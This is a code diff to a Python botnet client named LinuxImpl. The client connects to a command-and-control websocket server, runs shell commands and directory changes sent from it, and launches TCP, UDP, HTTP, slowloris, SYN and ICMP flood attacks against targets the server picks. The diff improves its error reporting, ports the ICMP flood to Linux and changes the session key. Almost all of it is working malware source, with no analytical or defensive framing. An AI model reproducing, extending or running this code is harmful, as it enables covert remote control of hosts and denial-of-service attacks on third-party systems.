@@ -34,12 +34,12 @@ class LinuxImpl:
         self.attacks = []
         self.retry_count = 0
         self.max_retry_delay = 300  
+        self.count = 0  
 
     async def run(self) -> None:
         
         while self.running:
             try:
-                
                 await self.register()
                 await self._connect_to_c2()
                 
@@ -61,6 +61,7 @@ class LinuxImpl:
         await asyncio.sleep(delay)
 
     async def _connect_to_c2(self) -> None:
+
         try:
             
             async with connect(
@@ -71,24 +72,17 @@ class LinuxImpl:
                 open_timeout=30
             ) as ws:
                 self.retry_count = 0  
-                
-                rec = await asyncio.wait_for(ws.recv(), timeout=60)
 
-                if "Invalid conection" in str(rec).strip():
-                    sys.exit(0)
 
                 while self.running:
                     try:
                         await self._handle_commands(ws)
                     except ConnectionClosedError:
-                        print(e)
                         raise
                     except Exception as e:
-                        print(e)
                         await asyncio.sleep(1)
                         
         except Exception as e:
-            print(e)
             raise
 
     async def _handle_commands(self, ws) -> None:
@@ -96,6 +90,7 @@ class LinuxImpl:
             
             cmd = await asyncio.wait_for(ws.recv(), timeout=60)
             data = json.loads(cmd)
+
 
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
@@ -109,11 +104,12 @@ class LinuxImpl:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
+            elif 'Invalid conection' in data:
+                await self._exit(ws)
             elif 'finish' in data:
                 await self._exit(ws)
         
         except asyncio.TimeoutError:
-            
             pass
         except ConnectionClosedError:
             raise
@@ -226,6 +222,28 @@ class LinuxImpl:
             "cwd": self.current_dir
         }, ensure_ascii=False))
         
+
+    async def _change_directory(self, ws, path: str) -> None:
+        path = path.replace('"', '')
+        if path == "..":
+            self.current_dir = os.path.dirname(self.current_dir)
+        else:
+            new_path = os.path.abspath(os.path.join(self.current_dir, path))
+            if os.path.isdir(new_path):
+                self.current_dir = new_path
+            else:
+                await ws.send(json.dumps({
+                    "error": f"Directory '{path}' doesn't exists.",
+                    "cwd": self.current_dir
+                }))
+                return
+        
+        await ws.send(json.dumps({
+            "result": "",
+            "error": "",
+            "cwd": self.current_dir
+        }))
+    
     
     def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
         try:
@@ -350,6 +368,9 @@ class LinuxImpl:
         target = data['attack']['target']
         duration = data['attack'].get('duration', 60)
 
+
+
+
         if len(self.attacks) == 0:
             loop = asyncio.get_event_loop()
             
@@ -358,15 +379,18 @@ class LinuxImpl:
                 args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
                 daemon=True
             )
-            attack_thread.start()
+
+            attack_thread.start()   
 
             self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
-            
             await ws.send(json.dumps({
                 "status": "attack_running",
                 "attack_type": attack_type,
                 "target": target
             }))
+
+        
+            
         else:
             for attack in self.attacks:
                 if attack_type == attack['type']:
@@ -393,24 +417,27 @@ class LinuxImpl:
     
     def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:
         end_time = time.time() + duration
-        
         try:
-            if attack_type == "tcp_flood":
-                self._tcp_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "udp_flood":
-                self._udp_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "http_flood":
+            if attack_type.strip() == "tcp_flood":
+                self._tcp_flood_attack(ws, target, end_time, stop_thread)
+            elif attack_type.strip() == "udp_flood":
+                self._udp_flood_attack(ws, target, end_time, stop_thread)
+            elif attack_type.strip() == "http_flood":
                 self._http_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "slowloris":
-                self._slowloris_attack(target, end_time, stop_thread)
-            elif attack_type == "syn_flood":
-                self._syn_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "icmp_flood":
-                self._icmp_flood_attack(target, end_time, stop_thread)
+            elif attack_type.strip() == "slowloris":
+                self._slowloris_attack(ws, target, end_time, stop_thread)
+            elif attack_type.strip() == "syn_flood":
+                self._syn_flood_attack(ws, target, end_time, stop_thread)
+            elif attack_type.strip() == "icmp_flood":
+                self._icmp_flood_attack(ws, target, end_time, stop_thread)
             else:
                 pass
         except Exception as e:
-            pass
+            print(e)
+            asyncio.run_coroutine_threadsafe(
+                self._notify_attack_error(ws, target, attack_type, str(e)),
+                loop
+            )
         finally:
             asyncio.run_coroutine_threadsafe(
                 self._notify_attack_completed(ws, attack_type, target),
@@ -423,10 +450,20 @@ class LinuxImpl:
                 "status": "attack_completed",
                 "attack_type": attack_type,
                 "target": target,
-                "message": "Ataque completado"
+                "message": "Attack completed"
             }))
         except Exception as e:
             pass
+
+    async def _notify_attack_error(self, ws, target: str, attack_type:str, error: str) -> None:
+
+        await ws.send(json.dumps({
+            "status": "attack_error",
+            "target": target,
+            "attack_type": attack_type,
+            "impl": self.impl_id,
+            "error": error
+        }))
 
     
     def _tcp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
@@ -440,8 +477,8 @@ class LinuxImpl:
                 s.connect((target_ip, target_port))
                 s.send(random._urandom(1024))
                 s.close()
-            except:
-                pass
+            except Exception as e:
+                continue
     
     def _udp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         target_ip, target_port = target.split(":")
@@ -453,10 +490,11 @@ class LinuxImpl:
                 s.sendto(random._urandom(1024), (target_ip, target_port))
                 s.close()
             except:
-                pass
+                continue
     
     def _http_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         import urllib.request
+
         
         if not target.startswith(('http://', 'https://')):
             target = 'http://' + target  
@@ -468,6 +506,7 @@ class LinuxImpl:
             'Accept': '*/*',
             'Connection': 'close'
         }
+
         
         request = urllib.request.Request(
             url=target,
@@ -476,14 +515,13 @@ class LinuxImpl:
         )
         
         while time.time() < end_time and not stop_thread.is_set():
-            try:
-                with urllib.request.urlopen(request) as response:
-                    response.read(64)  
-                time.sleep(0.01)
-            except urllib.error.URLError as e:
-                break
-            except Exception as e:
-                time.sleep(1)  
+                try:
+                    with urllib.request.urlopen(request) as response:
+                        response.read(64)  
+                    time.sleep(0.01)
+                except:
+                    continue
+
     
     def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
         target_ip, target_port = target.split(":")
@@ -502,6 +540,7 @@ class LinuxImpl:
                 except:
                     self._close_sockets(sockets)
                     sockets = []
+                    continue
                 for s in sockets:
                     try:
                         s.send("X-a: b\r\n".encode())
@@ -525,17 +564,16 @@ class LinuxImpl:
                 s.sendto(packet, (target_ip, target_port))
                 s.close()
             except:
-                pass
+                continue
     
     def _icmp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         import os
         
         while time.time() < end_time and not stop_thread.is_set():
             try:
-                if os.name == 'nt':
-                    os.system(f"ping -n 1 -l 65500 {target} > nul")
+                os.system(f"ping -c 1 -s 65500 {target} > nul")
             except:
-                pass
+                continue
     
     def _close_sockets(self, sockets: list) -> None:
         for s in sockets:
@@ -601,8 +639,7 @@ class LinuxImpl:
                     return False
             except Exception as e:
                 return False 
-            if attempt < max_attempts - 1:
-                await asyncio.sleep(3)
+        
         
         return False
 
@@ -697,7 +734,7 @@ if __name__ == "__main__":
     
     C2_WS_URL = "192.168.32.1:4444"
     GROUP_NAME = "grupo"
-    SESS_KEY = "123"
+    SESS_KEY = "12345678910"
     
     impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
     
